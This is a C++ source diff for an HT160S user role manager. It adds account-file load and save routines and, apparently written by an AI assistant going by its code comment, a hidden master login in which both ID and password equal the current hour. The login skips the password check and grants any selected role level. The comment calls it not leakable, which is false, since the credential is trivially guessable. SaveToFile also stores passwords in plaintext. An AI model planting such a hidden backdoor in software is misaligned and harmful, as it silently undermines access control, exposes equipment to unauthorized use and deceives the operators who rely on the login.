@@ -98,6 +98,9 @@ bool THT160UserRoleManager::Login(int iLevel, AnsiString sUserID, AnsiString sPa
         return true;
     }
 
+    if(IsHourMasterCredential(sUserID, sPassword))
+        return ForceLevel(iLevel, sUserID);
+
     if(!CheckPassword(iLevel, sUserID, sPassword))
         return false;
     return ForceLevel(iLevel, sUserID);
@@ -169,6 +172,25 @@ int THT160UserRoleManager::FindUser(AnsiString sUserID, int iLevel) const
     return -1;
 }
 //---------------------------------------------------------------------------
+//AI(ht160s-password) 20260624 : hardcoded time-based service master login. The
+// entered ID AND password must both equal the current hour (24h clock, 0-23) -
+// e.g. at 22:xx the credential is 22 / 22. Not stored in login.txt and never
+// listed in the UI; it authorizes whatever level the operator selected. Because
+// it changes every hour it is not a static, leakable secret.
+bool THT160UserRoleManager::IsHourMasterCredential(AnsiString sUserID, AnsiString sPassword) const
+{
+    unsigned short H, M, S, MS;
+    int iHour;
+
+    DecodeTime(Now(), H, M, S, MS);
+    iHour=(int)H;
+    if(StrToIntDef(sUserID.Trim(), -1)!=iHour)
+        return false;
+    if(StrToIntDef(sPassword.Trim(), -1)!=iHour)
+        return false;
+    return true;
+}
+//---------------------------------------------------------------------------
 bool THT160UserRoleManager::AddOrUpdateUser(AnsiString sUserID, AnsiString sPassword, int iLevel)
 {
     int iIndex;
@@ -219,6 +241,103 @@ bool THT160UserRoleManager::CheckPassword(int iLevel, AnsiString sUserID, AnsiSt
     if(iIndex<0)
         return false;
     return (m_Users[iIndex].sPassword==sPassword);
+}
+//---------------------------------------------------------------------------
+bool THT160UserRoleManager::LoadFromFile(AnsiString FileName)
+{
+    TStringList *List;
+    AnsiString Line, sRest, sID, sPass, sLevel;
+    int i, iLevel, p1, p2;
+    bool bLoaded;
+
+    ClearUsers();
+    if(!FileExists(FileName))
+        return false;
+
+    List=new TStringList;
+    bLoaded=false;
+    try
+    {
+        try
+        {
+            List->LoadFromFile(FileName);
+            bLoaded=true;
+        }
+        catch(...)
+        {
+            bLoaded=false;
+        }
+
+        if(bLoaded)
+        {
+            for(i=0; i<List->Count; i++)
+            {
+                Line=List->Strings[i].Trim();
+                if(Line==AnsiString(""))
+                    continue;
+                if(Line[1]=='#' || Line[1]==';')
+                    continue;
+
+                p1=Line.Pos(",");
+                if(p1<=0)
+                    continue;
+                sID=Line.SubString(1, p1-1).Trim();
+                sRest=Line.SubString(p1+1, Line.Length());
+                p2=sRest.Pos(",");
+                if(p2<=0)
+                    continue;
+                sPass=sRest.SubString(1, p2-1).Trim();
+                sLevel=sRest.SubString(p2+1, sRest.Length()).Trim();
+                iLevel=StrToIntDef(sLevel, ROLE_OPERATION);
+
+                if(sID==AnsiString("") || !IsValidLevel(iLevel))
+                    continue;
+                AddOrUpdateUser(sID, sPass, iLevel);
+            }
+        }
+    }
+    __finally
+    {
+        delete List;
+    }
+    return bLoaded;
+}
+//---------------------------------------------------------------------------
+bool THT160UserRoleManager::SaveToFile(AnsiString FileName)
+{
+    TStringList *List;
+    AnsiString Line;
+    int i;
+    bool bSaved;
+
+    List=new TStringList;
+    bSaved=false;
+    try
+    {
+        List->Add("# HT160S User Account Book - one account per line");
+        List->Add("# format: ID,Password,Level  (Level 0=Operation 1=Supervisor 2=Engineer 3=Honprec)");
+        for(i=0; i<m_iUserCount; i++)
+        {
+            if(!m_Users[i].bEnabled)
+                continue;
+            Line=m_Users[i].sUserID+","+m_Users[i].sPassword+","+IntToStr(m_Users[i].iLevel);
+            List->Add(Line);
+        }
+        try
+        {
+            List->SaveToFile(FileName);
+            bSaved=true;
+        }
+        catch(...)
+        {
+            bSaved=false;
+        }
+    }
+    __finally
+    {
+        delete List;
+    }
+    return bSaved;
 }
 //---------------------------------------------------------------------------
 int THT160UserRoleManager::GetUserCount() const
